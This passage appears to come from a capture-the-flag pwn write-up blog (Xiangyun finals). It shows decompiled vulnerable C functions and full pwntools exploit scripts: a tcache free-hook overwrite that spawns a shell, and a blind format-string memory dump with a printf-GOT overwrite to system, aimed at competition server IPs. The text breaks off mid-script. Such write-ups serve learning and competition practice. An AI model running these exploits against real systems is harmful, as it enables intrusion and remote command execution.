<h3 id="vul-1"><a href="#vul-1" class="headerlink" title="vul"></a>vul</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">del2</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">if</span> ( flag )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;which tree do you want to steal?&quot;</span>);<br>  v0 = inputn();<br>  <span class="hljs-keyword">if</span> ( v0 &gt;= <span class="hljs-number">0</span> &amp;&amp; v0 &lt;= <span class="hljs-number">8</span> &amp;&amp; p_arr[v0] )<br>    <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span> *)p_arr[v0]);                    <span class="hljs-comment">// vul</span><br>  flag = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-comment"># Env: Linux arch 5.8.14-arch1-1</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li  = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;pwn&#x27;</span><br>MODIFY_LD = <span class="hljs-number">0</span><br>arch = <span class="hljs-string">&#x27;64&#x27;</span><br>libc_v = <span class="hljs-string">&#x27;2.29&#x27;</span><br><br>ld_path   = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span><br>libs_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><br><span class="hljs-comment"># change ld path </span><br><span class="hljs-keyword">if</span>(MODIFY_LD):<br>	os.system(<span class="hljs-string">&#x27;cp &#x27;</span> + elf_path + <span class="hljs-string">&#x27; &#x27;</span> + elf_path + <span class="hljs-string">&#x27;.bk&#x27;</span>)<br>	change_ld_cmd = <span class="hljs-string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="hljs-string">&#x27; &#x27;</span> + elf_path<br>	os.system(change_ld_cmd)<br>	li(<span class="hljs-string">&#x27;modify ld ok!&#x27;</span>)<br>	exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;8.131.69.237&quot;</span><br>server_port = <span class="hljs-number">32452</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><br><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">i, d</span>):<br>	sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br>	sa(<span class="hljs-string">&#x27;?&#x27;</span>, d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">i</span>):<br>	sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">i</span>):<br>	sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q</span>():<br>	sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm2</span>(<span class="hljs-params">i</span>):<br>	sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad2</span>():<br>	sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>)<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>		ad(i, <span class="hljs-string">&#x27;A&#x27;</span>)<br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>		rm(<span class="hljs-number">7</span> - i)<br>	rm(<span class="hljs-number">0</span>)<br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>		ad(i, <span class="hljs-string">&#x27;A&#x27;</span>)<br>	ad2()<br><br><br>	ad(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>		rm(<span class="hljs-number">7</span> - i)<br><br>	rm(<span class="hljs-number">0</span>)<br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>		ad(i, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">8</span>)<br>	<br>	ad(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">8</span>)<br><br>	dp(<span class="hljs-number">7</span>)<br>	leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>)<br>	libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x10</span> - <span class="hljs-number">96</span><br>	free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>	system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>		rm(<span class="hljs-number">7</span> - i)<br>	rm2(<span class="hljs-number">0</span>)<br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>		ad(i + <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br><br>	p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xd0</span><br>	p += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x110</span>)<br>	p += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br><br>	ad(<span class="hljs-number">8</span>, p)<br>	rm(<span class="hljs-number">0</span>)<br><br>	rm(<span class="hljs-number">8</span>)<br>	p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xd0</span><br>	p += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x110</span>)<br>	p += p64(free_hook) + p64(<span class="hljs-number">0</span>)<br>	ad(<span class="hljs-number">8</span>, p)<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>		rm(i)<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>		ad(i, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>	ad(<span class="hljs-number">7</span>, p64(system))<br>	<span class="hljs-comment">#db()</span><br>	rm(<span class="hljs-number">1</span>)<br>	<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )<br>	<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br><br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>





<h2 id="祥云总决赛pwn"><a href="#祥云总决赛pwn" class="headerlink" title="祥云总决赛pwn"></a>祥云总决赛pwn</h2><h3 id="解题模式"><a href="#解题模式" class="headerlink" title="解题模式"></a>解题模式</h3><h4 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h4><p>字符串漏洞盲打pwn，根据字符串漏洞dump远程文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;critical&#x27;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;pwn_bin&quot;</span>, <span class="hljs-string">&quot;ab+&quot;</span>)<br>begin = <span class="hljs-number">0x400000</span><br>offset = <span class="hljs-number">0</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>	io = remote(<span class="hljs-string">&#x27;172.20.2.8&#x27;</span>, <span class="hljs-number">15865</span>)<br>	io.recvuntil(<span class="hljs-string">&#x27;floor\n&#x27;</span>)<br>	addr = begin + offset	<br>	p = <span class="hljs-string">b&#x27;%10$sABCD&#x27;</span><br>	p = p.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>	p += p64(<span class="hljs-number">0x0</span>) * <span class="hljs-number">2</span><br>	p += p64(addr)<br>	io.sendline(p)<br>	<span class="hljs-keyword">try</span>:<br>		info = io.recvuntil(<span class="hljs-string">&#x27;ABCD&#x27;</span>,drop=<span class="hljs-literal">True</span>)<br>		remain = io.recvrepeat(<span class="hljs-number">0.2</span>)<br>	<span class="hljs-keyword">except</span> EOFError:<br>		<span class="hljs-keyword">break</span><br>	<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(info)==<span class="hljs-number">0</span>:<br>		offset += <span class="hljs-number">1</span><br>		f.write(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>	<span class="hljs-keyword">else</span>:<br>		info += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>		offset += <span class="hljs-built_in">len</span>(info)<br>		f.write(info)<br>		f.flush()<br>	io.close() <br>f.close()<br><br></code></pre></td></tr></table></figure>

<p>dump下来后，分析，打印__libc_start_main的got表地址发现后三位为750，是libc2.23的，在进行24轮的输入输出之后，一次输入很大的数据，采用字符串漏洞一次完成修改printf的got表为system函数，下一次输入传入”;sh\x00”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+0h] [rbp-500h]</span><br><br>  sub_400600((__int64)&amp;v4, <span class="hljs-number">0LL</span>, <span class="hljs-number">1280LL</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>();<br>    MEMORY[<span class="hljs-number">0x602089</span>] = sub_400630((__int64)<span class="hljs-string">&quot;DO you want to exit Y/N or y/n &quot;</span>);<br>    sub_400630((__int64)<span class="hljs-string">&quot;DO you want to exit Y/N or y/n &quot;</span>);<br>    result = MEMORY[<span class="hljs-number">0x602089</span>];<br>    <span class="hljs-keyword">if</span> ( MEMORY[<span class="hljs-number">0x602089</span>] == <span class="hljs-string">&#x27;Y&#x27;</span> )<br>      <span class="hljs-keyword">break</span>;<br>    result = MEMORY[<span class="hljs-number">0x602089</span>];<br>    <span class="hljs-keyword">if</span> ( MEMORY[<span class="hljs-number">0x602089</span>] == <span class="hljs-string">&#x27;y&#x27;</span> )<br>      <span class="hljs-keyword">break</span>;<br>    read(<span class="hljs-number">0LL</span>, (__int64)&amp;v4, <span class="hljs-number">0x501</span>LL);<br>    <span class="hljs-built_in">printf</span>((__int64)&amp;v4);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-comment">#from LibcSearcher import *</span><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;172.20.2.8&quot;</span><br>server_port = <span class="hljs-number">15865</span><br><br><span class="hljs-comment"># if local debug</span><br>libc_path =<span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	offset = <span class="hljs-number">10</span><br>	libc_start_main = <span class="hljs-number">0x602040</span><br>	p = <span class="hljs-string">b&#x27;%10$sABCD&#x27;</span><br>	p = p.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>	p += p64(<span class="hljs-number">0x0</span>) * <span class="hljs-number">2</span><br>	p += p64(libc_start_main)<br>	p = p.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>	s(p)<br><br>	leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>)<br>	li(<span class="hljs-string">&#x27;leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br>	offset__libc_start_main = libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>	__libc_start_main = leak<br>	libc_base = leak - offset__libc_start_main<br>	system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	<span class="hljs-comment">#libc = LibcSearcher(&#x27;__libc_start_main&#x27;, leak)</span><br><br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	li(<span class="hljs-string">&#x27;__libc_start_main: &#x27;</span> + <span class="hljs-built_in">hex</span>(__libc_start_main))<br><br>	sl(<span class="hljs-string">&#x27;ok&#x27;</span>)<br>	<span class="hljs-comment">#__libc_start_main+240</span><br>	<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">23</span>):<br>		sla(<span class="hljs-string">&#x27;ok&#x27;</span>, <span class="hljs-string">&#x27;ok&#x27;</span>)<br><br>	sla(<span class="hljs-string">&#x27;y/n&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>)<br>	printf_got = <span class="hljs-number">0x602028</span><br><br>	offset = <span class="hljs-number">6</span> + <span class="hljs-number">6</span><br>	b31 = ((system &amp; <span class="hljs-number">0xFFFFFF</span>) &gt;&gt; (<span class="hljs-number">8</span> * <span class="hljs-number">2</span>)) &amp; <span class="hljs-number">0xFF</span><br>	b22 = system &amp; <span class="hljs-number">0xFFFF</span><br>	li(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;b31: &#x27;</span> + <span class="hljs-built_in">hex</span>(b31))<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;b22: &#x27;</span> + <span class="hljs-built_in">hex</span>(b22))<br>	li(<span class="hljs-string">&#x27;o_printf: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]))<br>	li(<span class="hljs-string">&#x27;o_system: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>	li(<span class="hljs-string">&#x27;free: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]))<br><br>	p  =  <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(b31) + <span class="hljs-string">b&#x27;c%&#x27;</span> + <span class="hljs-built_in">str</span>(offset) + <span class="hljs-string">b&#x27;$hhn&#x27;</span><br>	p  +=  <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(b22 - b31) + <span class="hljs-string">b&#x27;c%&#x27;</span> + <span class="hljs-built_in">str</span>(offset + <span class="hljs-number">1</span>) + <span class="hljs-string">b&#x27;$hn&#x27;</span><br>	p =  p.ljust(<span class="hljs-number">0x8</span> * <span class="hljs-number">6</span>, <span 